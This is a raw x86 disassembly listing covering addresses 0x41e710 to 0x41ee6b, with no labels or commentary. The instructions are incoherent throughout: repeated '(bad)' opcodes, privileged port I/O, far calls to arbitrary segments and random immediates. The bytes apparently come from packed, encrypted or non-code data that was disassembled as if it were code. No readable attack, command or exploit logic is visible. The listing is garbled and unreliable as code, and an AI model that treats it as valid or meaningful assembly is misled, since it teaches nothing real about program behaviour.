  41e710:	mov    edi,0x7d887d3b
  41e715:	out    0x28,al
  41e717:	mov    al,0xcb
  41e719:	mov    BYTE PTR [ecx],ah
  41e71b:	in     eax,dx
  41e71c:	pushf  
  41e71d:	dec    ecx
  41e71e:	xor    ecx,DWORD PTR [esi-0x4a]
  41e721:	pusha  
  41e722:	pop    edi
  41e723:	mov    dl,0x8e
  41e725:	adc    DWORD PTR [ebx+ebx*8+0x75353179],ecx
  41e72c:	mov    WORD PTR [ebx+esi*2],es
  41e72f:	loopne 0x41e6eb
  41e731:	aad    0xe6
  41e733:	(bad)  
  41e734:	jo     0x41e706
  41e736:	lds    ecx,FWORD PTR [ebx+edi*1]
  41e739:	jo     0x41e764
  41e73b:	pop    ebp
  41e73c:	fptan  
  41e73e:	mov    al,0xfb
  41e740:	cmp    cl,BYTE PTR [eax+0x6277fd8b]
  41e746:	popa   
  41e747:	mov    ebp,0xb1a0e93d
  41e74c:	xor    eax,0x2cc23d02
  41e751:	rol    BYTE PTR [eax],0x73
  41e754:	stos   DWORD PTR es:[edi],eax
  41e755:	cmp    ah,dh
  41e757:	mov    bh,ah
  41e759:	mov    ds:0x749ea7f,al
  41e75e:	popf   
  41e75f:	dec    edi
  41e760:	adc    edx,ebp
  41e762:	retf   0xc81
  41e765:	sub    ecx,edx
  41e767:	jl     0x41e730
  41e769:	sbb    ebp,DWORD PTR [edx-0x54]
  41e76c:	xor    DWORD PTR [ecx],edx
  41e76e:	mov    edx,0x44d05084
  41e773:	push   0xfffffff5
  41e775:	(bad)  
  41e776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e777:	pop    ecx
  41e778:	icebp  
  41e779:	sahf   
  41e77a:	into   
  41e77b:	je     0x41e797
  41e77d:	rcr    cl,cl
  41e77f:	ins    BYTE PTR es:[edi],dx
  41e780:	out    dx,eax
  41e781:	pop    eax
  41e782:	fwait
  41e783:	das    
  41e784:	(bad)  
  41e785:	dec    ecx
  41e786:	jmp    0x926c3944
  41e78b:	scas   eax,DWORD PTR es:[edi]
  41e78c:	mov    ch,0x7b
  41e78e:	dec    ecx
  41e78f:	retf   
  41e790:	and    al,0x75
  41e792:	(bad)  
  41e793:	xor    bl,cl
  41e795:	xor    al,0xd1
  41e797:	aaa    
  41e798:	sbb    al,0x89
  41e79a:	test   al,0xcb
  41e79c:	sbb    eax,0x5081c3c1
  41e7a1:	std    
  41e7a2:	xchg   esp,eax
  41e7a3:	xchg   ecx,eax
  41e7a4:	and    edi,DWORD PTR [edx-0x28]
  41e7a7:	jb     0x41e789
  41e7a9:	cmp    ebp,0x818c0772
  41e7af:	sbb    DWORD PTR [ebx+0x50],0x56f0b506
  41e7b6:	push   0xc2f889ce
  41e7bb:	lds    edx,FWORD PTR [ecx]
  41e7bd:	and    DWORD PTR [eax-0x4b],ebp
  41e7c0:	fld    QWORD PTR [edx]
  41e7c2:	xchg   ebx,eax
  41e7c3:	shr    BYTE PTR [esi-0x8fda1f3],0x64
  41e7ca:	pop    DWORD PTR [ebx]
  41e7cc:	in     eax,0x3e
  41e7ce:	push   0x906ff78c
  41e7d3:	or     al,0x45
  41e7d5:	ret    
  41e7d6:	or     BYTE PTR [eax+0x6d],al
  41e7d9:	into   
  41e7da:	push   ds
  41e7db:	mov    bh,0x3b
  41e7dd:	sub    ebp,ebx
  41e7df:	or     BYTE PTR [ecx-0x1196e38],bh
  41e7e5:	xor    DWORD PTR [ebx],eax
  41e7e7:	ret    0x96ce
  41e7ea:	jg     0x41e836
  41e7ec:	hlt    
  41e7ed:	loop   0x41e7cf
  41e7ef:	dec    ebp
  41e7f0:	cs or  al,0x71
  41e7f3:	mov    ah,0x5a
  41e7f5:	fstp   QWORD PTR [edx+0x730414bc]
  41e7fb:	cmc    
  41e7fc:	pop    ss
  41e7fd:	into   
  41e7fe:	mov    bl,0x34
  41e800:	mov    ch,0x22
  41e802:	jne    0x41e79b
  41e804:	xchg   DWORD PTR [esi+0x13],ecx
  41e807:	xchg   edi,eax
  41e808:	ins    DWORD PTR es:[edi],dx
  41e809:	push   0xb5ba5180
  41e80e:	mov    DWORD PTR [ebp-0xe4b5f5b],esi
  41e814:	or     BYTE PTR [ebx*4-0x26e761f4],cl
  41e81b:	dec    esp
  41e81c:	sar    DWORD PTR [ebp-0x6a7836b4],cl
  41e822:	rcl    DWORD PTR [esi+eax*8+0x6f],1
  41e826:	imul   ebx,ebp,0x79
  41e829:	out    dx,al
  41e82a:	pusha  
  41e82b:	dec    ebx
  41e82c:	jge    0x41e84f
  41e82e:	adc    DWORD PTR ds:0x52ef00e5,ebx
  41e834:	fs or  al,0xc2
  41e837:	jmp    0x41e8b1
  41e839:	jp     0x41e80c
  41e83b:	lock fsub DWORD PTR [edi]
  41e83e:	ins    DWORD PTR es:[edi],dx
  41e83f:	(bad)  
  41e840:	cmp    al,0x4a
  41e842:	push   esi
  41e843:	neg    BYTE PTR [ebx-0x13]
  41e846:	push   esp
  41e847:	adc    BYTE PTR [esi-0x2d78f2e1],bl
  41e84d:	retf   
  41e84e:	push   esi
  41e84f:	scas   eax,DWORD PTR es:[edi]
  41e850:	and    BYTE PTR [edx],cl
  41e852:	pop    esi
  41e853:	int    0x33
  41e855:	mov    DWORD PTR [edi+0x61a09ced],esi
  41e85b:	xor    BYTE PTR [esi-0x6a815e7],0xdc
  41e862:	imul   BYTE PTR [edi]
  41e864:	shl    DWORD PTR [ebp+0x4dd6db97],1
  41e86a:	push   0xffffffd8
  41e86c:	add    DWORD PTR [edi+0x75137f55],esp
  41e872:	int3   
  41e873:	(bad)  
  41e874:	push   edi
  41e875:	dec    ebp
  41e876:	push   es
  41e877:	retf   0x98d6
  41e87a:	nop
  41e87b:	push   ebx
  41e87c:	imul   edi,DWORD PTR [ebp+0x43],0x24
  41e880:	xor    bl,dl
  41e882:	iret   
  41e883:	data16 clc 
  41e885:	cmp    al,0x6
  41e887:	pop    ss
  41e888:	fcomp  DWORD PTR [edi+0x13]
  41e88b:	das    
  41e88c:	dec    ebx
  41e88d:	repnz jecxz 0x41e840
  41e890:	cmp    eax,0xc899a8cf
  41e895:	outs   dx,BYTE PTR ds:[esi]
  41e896:	inc    esp
  41e897:	inc    ebp
  41e898:	fsubr  DWORD PTR [esi-0x39]
  41e89b:	sar    ecx,1
  41e89d:	call   0x912:0x7ae46093
  41e8a4:	fsubr  QWORD PTR [esi-0x7989da15]
  41e8aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8ab:	cmp    BYTE PTR [ebp+0x63],dh
  41e8ae:	inc    ebp
  41e8af:	sub    eax,0x4f242666
  41e8b4:	push   eax
  41e8b5:	add    DWORD PTR ds:0xe7ba6439,ecx
  41e8bb:	test   eax,0xa7cc76c9
  41e8c0:	js     0x41e8f6
  41e8c2:	mov    esi,0xadec2d3f
  41e8c7:	push   eax
  41e8c8:	xchg   ebp,eax
  41e8c9:	hlt    
  41e8ca:	xor    al,BYTE PTR [edi-0x275c7344]
  41e8d0:	xor    DWORD PTR [edi],esp
  41e8d2:	pusha  
  41e8d3:	mov    esp,0x222e17ec
  41e8d8:	adc    eax,0x42bcf6df
  41e8dd:	(bad)  
  41e8df:	add    BYTE PTR [ebx+0x3c9cbb0d],dl
  41e8e5:	and    cl,BYTE PTR [eax+0x86eb6a7]
  41e8eb:	dec    esi
  41e8ec:	sub    bh,0x8b
  41e8ef:	aad    0xc
  41e8f1:	cwde   
  41e8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8f3:	mov    dh,0x1e
  41e8f5:	icebp  
  41e8f6:	iret   
  41e8f7:	mov    al,0xc1
  41e8f9:	mov    ebx,0x869e2eee
  41e8fe:	iret   
  41e8ff:	xor    ch,BYTE PTR [ebp+0x2061fede]
  41e905:	imul   ebx,DWORD PTR [edi],0x50f750f2
  41e90b:	jp     0x41e8db
  41e90d:	mov    ds:0xbb160135,eax
  41e912:	xor    BYTE PTR [eax+ecx*8-0x1f67ca8b],dl
  41e919:	jo     0x41e93d
  41e91b:	push   eax
  41e91c:	mov    eax,0x51b35eda
  41e921:	dec    ebx
  41e922:	inc    ecx
  41e923:	sub    DWORD PTR [eax],edx
  41e925:	fucomp st(4)
  41e927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e928:	jge    0x41e8ae
  41e92a:	data16 mov ds:0x1e872390,al
  41e930:	ds push cs
  41e932:	jecxz  0x41e961
  41e934:	pop    ebp
  41e935:	leave  
  41e936:	ret    
  41e937:	add    edx,ecx
  41e939:	adc    al,0x1a
  41e93b:	jo     0x41e90f
  41e93d:	arpl   sp,si
  41e93f:	jge    0x41e90a
  41e941:	out    dx,eax
  41e942:	mov    ds:0x33a754f5,eax
  41e947:	mov    DWORD PTR [edi],eax
  41e949:	sbb    BYTE PTR [ebx+0x1c],dl
  41e94c:	shl    DWORD PTR [esi+0x6c],0xea
  41e950:	outs   dx,DWORD PTR ds:[esi]
  41e951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e952:	inc    edi
  41e953:	or     eax,0x40913a9b
  41e958:	(bad)  
  41e959:	aaa    
  41e95a:	jecxz  0x41e944
  41e95c:	dec    esi
  41e95d:	out    dx,eax
  41e95e:	jle    0x41e949
  41e960:	retf   
  41e961:	hlt    
  41e962:	pop    ebx
  41e963:	ins    BYTE PTR es:[edi],dx
  41e964:	mov    cl,0x79
  41e966:	add    esp,DWORD PTR [ebp+0x77]
  41e969:	cmp    DWORD PTR [ebx-0x73],esp
  41e96c:	inc    edx
  41e96d:	or     eax,0x90012ccf
  41e972:	jge    0x41e930
  41e974:	add    bh,BYTE PTR [edi+ebp*8+0x15]
  41e978:	mov    ah,0x72
  41e97a:	nop
  41e97b:	jb     0x41e9a0
  41e97d:	ds mov ch,0x9c
  41e980:	pop    edi
  41e981:	xor    esi,DWORD PTR [esi]
  41e983:	jecxz  0x41e91d
  41e985:	mov    eax,ds:0x4c82994d
  41e98a:	dec    edi
  41e98b:	xchg   edx,eax
  41e98c:	xchg   ecx,eax
  41e98d:	inc    ebx
  41e98e:	test   eax,0xa0e993df
  41e993:	sbb    DWORD PTR [ebx+ecx*1+0x49],0xff7f310e
  41e99b:	js     0x41e966
  41e99d:	pop    es
  41e99e:	in     eax,dx
  41e99f:	out    0x38,al
  41e9a1:	and    eax,0x566ae119
  41e9a6:	es data16 cmp al,0x92
  41e9aa:	push   ebp
  41e9ab:	call   0x3d:0x9cf0d22a
  41e9b2:	jmp    0x369a2cb3
  41e9b7:	fld    DWORD PTR [edi+0x3adf3171]
  41e9bd:	cmp    eax,0x1942ac86
  41e9c2:	add    cl,0x99
  41e9c5:	(bad)  
  41e9c6:	call   0xabca:0xb96360b9
  41e9cd:	mov    ah,0x29
  41e9cf:	retf   
  41e9d0:	loope  0x41e959
  41e9d2:	adc    al,0x9
  41e9d4:	loopne 0x41ea3a
  41e9d6:	mov    bh,0x9
  41e9d8:	jecxz  0x41e963
  41e9da:	jnp    0x41e98f
  41e9dc:	repnz test BYTE PTR [ebp+ebx*2+0x2597b7f8],al
  41e9e4:	in     eax,0x61
  41e9e6:	mov    WORD PTR [ecx],es
  41e9e8:	sbb    BYTE PTR [esi+0x46],dl
  41e9eb:	ins    BYTE PTR es:[edi],dx
  41e9ec:	arpl   cx,ax
  41e9ee:	outs   dx,BYTE PTR ds:[esi]
  41e9ef:	push   0xce8248df
  41e9f4:	and    eax,0x8f409a57
  41e9f9:	in     eax,0x1a
  41e9fb:	ins    BYTE PTR es:[edi],dx
  41e9fc:	xor    DWORD PTR [esi-0x4c],ecx
  41e9ff:	sub    eax,0x80905807
  41ea04:	push   es
  41ea05:	jae    0x41ea49
  41ea07:	mov    ss,WORD PTR [ebp+0x16]
  41ea0a:	test   eax,0xbca24edd
  41ea0f:	mov    ds:0xc0f491d0,al
  41ea14:	sbb    eax,0x74f39d58
  41ea19:	aas    
  41ea1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea1b:	xlat   BYTE PTR ds:[ebx]
  41ea1c:	loopne 0x41ea2c
  41ea1e:	fstp   DWORD PTR [ecx+edi*1-0x46]
  41ea22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea23:	xchg   ebp,eax
  41ea24:	sbb    bl,cl
  41ea26:	or     BYTE PTR [esi-0x2f2f8840],bl
  41ea2c:	enter  0x19cb,0x59
  41ea30:	ds jne 0x41ea8d
  41ea33:	xchg   BYTE PTR [edi-0x5f],cl
  41ea36:	pop    eax
  41ea37:	and    al,0x45
  41ea39:	jae    0x41ea4b
  41ea3b:	jne    0x41e9d5
  41ea3d:	imul   ebp,DWORD PTR [esi+0x5f],0x1e38cf01
  41ea44:	jo     0x41e9f3
  41ea46:	scas   eax,DWORD PTR es:[edi]
  41ea47:	stos   BYTE PTR es:[edi],al
  41ea48:	xchg   esp,eax
  41ea49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea4a:	sbb    ebp,DWORD PTR [ebp+0x3c34b235]
  41ea50:	mov    dh,0xdf
  41ea52:	xor    eax,0x251a18b2
  41ea57:	(bad)  
  41ea58:	pop    ss
  41ea59:	jns    0x41ea83
  41ea5b:	and    eax,0xd35ad4de
  41ea60:	and    DWORD PTR [ebx+0x7b],edx
  41ea63:	mov    ah,0xdd
  41ea65:	daa    
  41ea66:	mov    edi,DWORD PTR [ebx-0x19]
  41ea69:	cmp    esp,ebp
  41ea6b:	call   0x3d68:0xbc684ff3
  41ea72:	jl     0x41ea9d
  41ea74:	mov    cl,0x88
  41ea76:	icebp  
  41ea77:	cli    
  41ea78:	sub    eax,0xc4b6b668
  41ea7d:	les    edi,FWORD PTR [edi-0x70b956d6]
  41ea83:	mov    cl,0x44
  41ea85:	push   cs
  41ea86:	lea    edx,[ebx+0x1311d8a1]
  41ea8c:	or     eax,0xfcbcd23
  41ea91:	xchg   edi,ebx
  41ea93:	adc    al,0xb1
  41ea95:	outs   dx,BYTE PTR ds:[esi]
  41ea96:	xchg   esi,eax
  41ea97:	imul   esp,DWORD PTR [eax-0x31],0xd38c5e27
  41ea9e:	fwait
  41ea9f:	sub    al,0x10
  41eaa1:	stos   DWORD PTR es:[edi],eax
  41eaa2:	jae    0x41ea54
  41eaa4:	(bad)  
  41eaa5:	mov    DWORD PTR [esi],esi
  41eaa7:	push   cs
  41eaa8:	pop    ebp
  41eaa9:	cli    
  41eaaa:	loope  0x41ea39
  41eaac:	adc    ebp,DWORD PTR [eax-0x3b2cbe89]
  41eab2:	pop    DWORD PTR [edx+0x2b]
  41eab5:	sub    al,0x2d
  41eab7:	sbb    eax,0xfc490159
  41eabc:	dec    ebp
  41eabd:	add    al,0xe4
  41eabf:	ret    0xaff5
  41eac2:	mov    esp,0x22f88aa4
  41eac7:	mov    al,ds:0x503f145b
  41eacc:	jb     0x41ea65
  41eace:	scas   eax,DWORD PTR es:[edi]
  41eacf:	je     0x41eb21
  41ead1:	or     ebp,DWORD PTR [ecx-0x6f]
  41ead4:	mov    dh,0x30
  41ead6:	fs dec edx
  41ead8:	pop    edx
  41ead9:	pop    ebx
  41eada:	pushf  
  41eadb:	aas    
  41eadc:	in     al,0x12
  41eade:	mov    ds:0x6ba2aa0d,eax
  41eae3:	inc    ecx
  41eae4:	xchg   edx,eax
  41eae5:	stos   DWORD PTR es:[edi],eax
  41eae6:	mov    edi,0x9bb6bccc
  41eaeb:	push   cs
  41eaec:	mov    ds:0xda935d10,al
  41eaf1:	pop    ebx
  41eaf2:	cmp    al,0x34
  41eaf4:	loope  0x41eab8
  41eaf6:	pop    DWORD PTR [ebx-0x50]
  41eaf9:	inc    ebx
  41eafa:	in     al,0x67
  41eafc:	mov    dl,0xa5
  41eafe:	std    
  41eaff:	bound  esi,QWORD PTR [eax+0x474f2288]
  41eb05:	sahf   
  41eb06:	dec    BYTE PTR [ebp-0x1691f72b]
  41eb0c:	inc    ecx
  41eb0d:	inc    ebp
  41eb0e:	leave  
  41eb0f:	pop    es
  41eb10:	ins    BYTE PTR es:[edi],dx
  41eb11:	pop    eax
  41eb12:	add    dh,al
  41eb14:	hlt    
  41eb15:	test   al,0x62
  41eb17:	repnz xor BYTE PTR [ebx+0x62],0x9c
  41eb1c:	adc    DWORD PTR [ebx+0x1],ecx
  41eb1f:	adc    DWORD PTR [ebx],0x74
  41eb22:	lods   eax,DWORD PTR ds:[esi]
  41eb23:	add    ecx,ecx
  41eb25:	push   es
  41eb26:	test   BYTE PTR [ecx-0x6],ch
  41eb29:	leave  
  41eb2a:	mov    cl,0xa3
  41eb2c:	inc    edx
  41eb2d:	rcl    bh,cl
  41eb2f:	push   eax
  41eb30:	outs   dx,DWORD PTR ds:[esi]
  41eb31:	xchg   edi,eax
  41eb32:	sar    DWORD PTR [edi-0x4b],cl
  41eb35:	push   ds
  41eb36:	iret   
  41eb37:	fsub   QWORD PTR [esi-0x59]
  41eb3a:	imul   esp,DWORD PTR [eax+0x71],0xa6e7e696
  41eb41:	lods   al,BYTE PTR ds:[esi]
  41eb42:	lds    esi,FWORD PTR [eax]
  41eb44:	icebp  
  41eb45:	cwde   
  41eb46:	je     0x41ebbd
  41eb48:	jnp    0x41eaf4
  41eb4a:	call   0x2471c20a
  41eb4f:	inc    ecx
  41eb50:	out    dx,eax
  41eb51:	push   edx
  41eb52:	mov    ds:0xc8c8b7c7,eax
  41eb57:	lea    ebp,[eax-0x5b]
  41eb5a:	mov    esp,0xadbb6d6
  41eb5f:	ja     0x41ebca
  41eb61:	mov    WORD PTR [ebp+eiz*1+0x7f9a04ab],ds
  41eb68:	push   ds
  41eb69:	or     eax,0xc836dc57
  41eb6e:	or     al,0x37
  41eb70:	je     0x41eb40
  41eb72:	imul   edx,DWORD PTR [esi+0x6ec8e38f],0xfffffff8
  41eb79:	int3   
  41eb7a:	or     BYTE PTR [ebx],al
  41eb7c:	bound  ecx,QWORD PTR [ebp-0x26]
  41eb7f:	or     al,BYTE PTR [ebp-0x3db56a35]
  41eb85:	xor    ecx,esp
  41eb87:	pop    esi
  41eb88:	jge    0x41ebc3
  41eb8a:	dec    eax
  41eb8b:	in     al,dx
  41eb8c:	data16 fs jo 0x41eb17
  41eb90:	mov    edx,0x2b750c70
  41eb95:	mov    esp,0x2fbef98a
  41eb9a:	inc    esp
  41eb9b:	pop    edi
  41eb9c:	pop    ecx
  41eb9d:	(bad)  
  41eba0:	jmp    0x41eba2
  41eba2:	inc    ebp
  41eba3:	stos   DWORD PTR es:[edi],eax
  41eba4:	jae    0x41ec07
  41eba6:	imul   ebx,DWORD PTR [eax+0x52aef270],0x4537f6b8
  41ebb0:	add    eax,0xe12b9799
  41ebb5:	xchg   edx,eax
  41ebb6:	daa    
  41ebb7:	call   0x35d0:0xa4d74575
  41ebbe:	out    dx,eax
  41ebbf:	push   esi
  41ebc0:	outs   dx,DWORD PTR ds:[esi]
  41ebc1:	cmp    BYTE PTR [eax+0x4c],ah
  41ebc4:	mov    ch,0x99
  41ebc6:	out    0xa4,eax
  41ebc8:	icebp  
  41ebc9:	mov    ecx,0x9c11e0c5
  41ebce:	cmp    edi,0x4e1c4c9a
  41ebd4:	test   BYTE PTR [ecx+edi*2+0x4b],bh
  41ebd8:	push   0xffffffaf
  41ebda:	imul   ebx,DWORD PTR [edx+edi*4+0x56],0x31
  41ebdf:	ret    
  41ebe0:	(bad)  
  41ebe1:	cdq    
  41ebe2:	lock cwde 
  41ebe4:	push   ebp
  41ebe5:	cmp    DWORD PTR [eax],ebx
  41ebe7:	xor    al,0x92
  41ebe9:	pop    ds
  41ebea:	cmp    esi,ebp
  41ebec:	mov    ch,0x74
  41ebee:	push   ecx
  41ebef:	mov    dl,0xf5
  41ebf1:	xchg   esi,eax
  41ebf2:	fistp  DWORD PTR [ebp-0x2a1db361]
  41ebf8:	sbb    al,0x52
  41ebfa:	retf   
  41ebfb:	inc    ebx
  41ebfc:	xchg   ecx,eax
  41ebfd:	inc    esi
  41ebfe:	pop    esp
  41ebff:	add    eax,0x2a50daab
  41ec04:	or     BYTE PTR [ebx],cl
  41ec06:	pop    eax
  41ec07:	xor    al,BYTE PTR [eax-0x107bdf62]
  41ec0d:	mov    dh,0x6a
  41ec0f:	rol    DWORD PTR [esi-0x2b],1
  41ec12:	rcr    BYTE PTR [edi-0x12],0x28
  41ec16:	int3   
  41ec17:	stos   BYTE PTR es:[edi],al
  41ec18:	inc    esi
  41ec19:	ror    BYTE PTR [ebp+ebp*4-0x42fd7773],0x3d
  41ec21:	fdivr  QWORD PTR [ebp-0x7]
  41ec24:	das    
  41ec25:	scas   eax,DWORD PTR es:[edi]
  41ec26:	or     edx,ebx
  41ec28:	cmp    eax,0x76516318
  41ec2d:	inc    esp
  41ec2e:	or     eax,DWORD PTR [ebp+0xafef893]
  41ec34:	push   edx
  41ec35:	iret   
  41ec36:	cwde   
  41ec37:	push   0x1a8daed8
  41ec3c:	and    BYTE PTR ds:0xd30ce3db,0x9e
  41ec43:	inc    edx
  41ec44:	jmp    0x72aa:0xfeae4f9b
  41ec4b:	cmp    bh,al
  41ec4d:	(bad)  
  41ec4e:	fwait
  41ec4f:	pop    esi
  41ec50:	int    0x81
  41ec52:	std    
  41ec53:	imul   ax,si,0x53
  41ec57:	in     eax,0xdc
  41ec59:	ret    0xd2db
  41ec5c:	fidivr DWORD PTR [ecx]
  41ec5e:	popa   
  41ec5f:	xchg   esi,eax
  41ec60:	xchg   ecx,eax
  41ec61:	mov    ch,0xe3
  41ec63:	mov    cl,BYTE PTR [eax]
  41ec65:	les    edx,FWORD PTR [ebp+0x46345392]
  41ec6b:	add    eax,0x720c2324
  41ec70:	mov    ch,0x13
  41ec72:	ja     0x41ec61
  41ec74:	(bad)  
  41ec75:	xor    cl,BYTE PTR [ecx+0x67]
  41ec78:	adc    DWORD PTR [esi+edi*1+0x300b3066],ecx
  41ec7f:	cld    
  41ec80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec81:	stos   DWORD PTR es:[edi],eax
  41ec82:	pop    ecx
  41ec83:	lods   al,BYTE PTR ds:[esi]
  41ec84:	add    esp,DWORD PTR [eax+0x39f63f67]
  41ec8a:	fcomp  DWORD PTR [ebx-0x2d585ad6]
  41ec91:	fidiv  DWORD PTR [esp+ebx*1-0x78]
  41ec95:	fidiv  DWORD PTR [eax-0x1e]
  41ec98:	xchg   ecx,eax
  41ec99:	dec    eax
  41ec9a:	popa   
  41ec9b:	ror    DWORD PTR ds:0x2a5b27a4,0x6c
  41eca2:	inc    ebp
  41eca3:	mov    bl,0x31
  41eca5:	mov    DWORD PTR [eax+0x639931d7],eax
  41ecab:	mov    bh,0xeb
  41ecad:	add    eax,0x6804d75a
  41ecb2:	jno    0x41ed01
  41ecb4:	test   esi,0xf46223e5
  41ecba:	cmp    eax,0x7fcb102d
  41ecbf:	push   edi
  41ecc0:	scas   al,BYTE PTR es:[edi]
  41ecc1:	or     DWORD PTR [eax],0xb219490e
  41ecc7:	push   es
  41ecc8:	sub    eax,0xd0b2f4d6
  41eccd:	sub    bh,BYTE PTR [edx]
  41eccf:	int    0xc0
  41ecd1:	into   
  41ecd2:	loope  0x41ed04
  41ecd4:	pop    ds
  41ecd5:	nop
  41ecd6:	push   ebx
  41ecd7:	or     eax,0x4b3720f1
  41ecdc:	stos   DWORD PTR es:[edi],eax
  41ecdd:	cmp    DWORD PTR [edx+0x52],esi
  41ece0:	cmc    
  41ece1:	cli    
  41ece2:	vmread DWORD PTR [edx+ecx*1-0x1a],esi
  41ece7:	mov    ds:0xb12292e3,al
  41ecec:	push   cs
  41eced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecee:	bound  ebp,QWORD PTR [edi]
  41ecf0:	or     bh,BYTE PTR [eax]
  41ecf2:	sbb    bl,dh
  41ecf4:	test   al,0xe4
  41ecf6:	mov    dl,0xa6
  41ecf8:	sub    DWORD PTR [ebx-0x825ed5f],edi
  41ecfe:	mov    ds:0x70c99ee2,eax
  41ed03:	inc    eax
  41ed04:	add    BYTE PTR [edi+esi*1+0x40eebc7e],0xd4
  41ed0c:	in     eax,dx
  41ed0d:	xlat   BYTE PTR ds:[ebx]
  41ed0e:	nop
  41ed0f:	push   edx
  41ed10:	mov    BYTE PTR cs:[ebx+0x4e],dl
  41ed14:	mov    ?,WORD PTR [edi+0x6a]
  41ed17:	into   
  41ed18:	jmp    0x6c3c:0xfb8825c4
  41ed1f:	fcmovbe st,st(7)
  41ed21:	dec    esi
  41ed22:	xor    eax,0x9a37ed85
  41ed27:	(bad)  
  41ed2b:	pop    esi
  41ed2c:	fmul   DWORD PTR [ebx+0x4e]
  41ed2f:	mov    ch,0x99
  41ed31:	adc    ebp,ecx
  41ed33:	cmp    BYTE PTR [esi-0xd4b979f],bl
  41ed39:	pop    ss
  41ed3a:	fbld   TBYTE PTR [esi-0x5dac5f40]
  41ed40:	cmp    bl,dh
  41ed42:	aam    0x6
  41ed44:	sbb    DWORD PTR [esi+0xe52daab],0x97aa35be
  41ed4e:	or     eax,DWORD PTR [ebp-0x44]
  41ed51:	loop   0x41edc0
  41ed53:	out    0xa3,al
  41ed55:	xchg   DWORD PTR [esi-0x5abec58d],edx
  41ed5b:	or     BYTE PTR [esi],0xf2
  41ed5e:	test   eax,0x1e5c9217
  41ed63:	enter  0xaa8c,0xf7
  41ed67:	aas    
  41ed68:	retf   0xc1a9
  41ed6b:	inc    ebx
  41ed6c:	sub    al,0x73
  41ed6e:	into   
  41ed6f:	xor    BYTE PTR ds:[edi],bl
  41ed72:	repz push eax
  41ed74:	(bad)  
  41ed76:	sub    ebx,ecx
  41ed78:	out    0xed,eax
  41ed7a:	lahf   
  41ed7b:	arpl   WORD PTR ds:0x7291fe71,dx
  41ed81:	pushf  
  41ed82:	mov    bh,0x60
  41ed84:	xchg   esp,eax
  41ed85:	sub    esp,DWORD PTR [ecx-0x80]
  41ed88:	aam    0xf5
  41ed8a:	cmc    
  41ed8b:	mov    edi,0x5a615733
  41ed90:	add    al,0xe6
  41ed92:	xor    bh,BYTE PTR [eax-0x502d1949]
  41ed98:	js     0x41ed33
  41ed9a:	or     BYTE PTR [edx+0x13],0x47
  41ed9e:	fmul   st(0),st
  41eda0:	jb     0x41ed9b
  41eda2:	mov    al,ds:0x884d4cd0
  41eda7:	pop    ebx
  41eda8:	push   eax
  41eda9:	test   DWORD PTR [ebp-0x6a],esi
  41edac:	into   
  41edad:	jae    0x41ee26
  41edaf:	sub    al,0x1a
  41edb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb2:	add    al,0x3b
  41edb4:	inc    esp
  41edb5:	mov    edi,DWORD PTR [ecx]
  41edb7:	lock push ebx
  41edb9:	mov    eax,0x6dab34dd
  41edbe:	sbb    eax,DWORD PTR [esi]
  41edc0:	sub    dl,BYTE PTR [ecx+0x69]
  41edc3:	aam    0x1
  41edc5:	adc    esi,DWORD PTR [eax-0x114bf36b]
  41edcb:	sub    ebp,DWORD PTR [eax-0xb]
  41edce:	or     DWORD PTR [edx+0x1b027f90],ecx
  41edd4:	dec    esi
  41edd5:	push   ecx
  41edd6:	push   esi
  41edd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edd8:	pop    edi
  41edd9:	xor    DWORD PTR [ebx-0x2d394d3c],edi
  41eddf:	xor    DWORD PTR [ebp+0x5],ebx
  41ede2:	add    DWORD PTR [ebx],edi
  41ede4:	leave  
  41ede5:	rcl    BYTE PTR [ebp+0x5f],cl
  41ede8:	or     BYTE PTR [edi],ah
  41edea:	retf   0x620b
  41eded:	jne    0x41ed86
  41edef:	cmp    DWORD PTR [ecx+eiz*8-0x4c],ebp
  41edf3:	mov    ah,0x7a
  41edf5:	retf   0xdbe5
  41edf8:	loopne 0x41edc3
  41edfa:	jne    0x41edb4
  41edfc:	xchg   esp,eax
  41edfd:	cs hlt 
  41edff:	std    
  41ee00:	cmc    
  41ee01:	jbe    0x41ee63
  41ee03:	lock nop
  41ee05:	ja     0x41ed9b
  41ee07:	lahf   
  41ee08:	push   ss
  41ee09:	pop    edx
  41ee0a:	call   0x16fb:0xa12fe691
  41ee11:	aaa    
  41ee12:	aas    
  41ee13:	mov    dl,0xeb
  41ee15:	std    
  41ee16:	aad    0xc5
  41ee18:	and    cl,bh
  41ee1a:	xor    cl,BYTE PTR [edi-0x1c]
  41ee1d:	jg     0x41ede9
  41ee1f:	lock ret 0x9286
  41ee23:	jge    0x41ee9a
  41ee25:	dec    esp
  41ee26:	xchg   edi,eax
  41ee27:	sbb    eax,0x21eea52a
  41ee2c:	js     0x41ee2b
  41ee2e:	mov    ah,0xb8
  41ee30:	add    dh,BYTE PTR [esi-0x1]
  41ee33:	ret    0xa772
  41ee36:	das    
  41ee37:	mov    bh,0xab
  41ee39:	dec    eax
  41ee3a:	lods   eax,DWORD PTR ds:[esi]
  41ee3b:	dec    ecx
  41ee3c:	push   edi
  41ee3d:	cmpps  xmm7,XMMWORD PTR [eax-0x623bc83d],0x43
  41ee45:	fist   WORD PTR [ebp+eiz*1+0x2b]
  41ee49:	push   ss
  41ee4a:	xchg   esp,eax
  41ee4b:	pushf  
  41ee4c:	fisubr WORD PTR [edx-0x47]
  41ee4f:	repz mov bl,0x44
  41ee52:	popf   
  41ee53:	lea    edi,[esi*4+0xfa959de]
  41ee5a:	dec    edi
  41ee5b:	clc    
  41ee5c:	jecxz  0x41edee
  41ee5e:	pop    ebp
  41ee5f:	pusha  
  41ee60:	push   esi
  41ee61:	dec    edx
  41ee62:	aaa    
  41ee63:	adc    eax,0x3f5778d5
  41ee68:	inc    esi
  41ee69:	cdq    
  41ee6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee6b:	js     0x41eee7
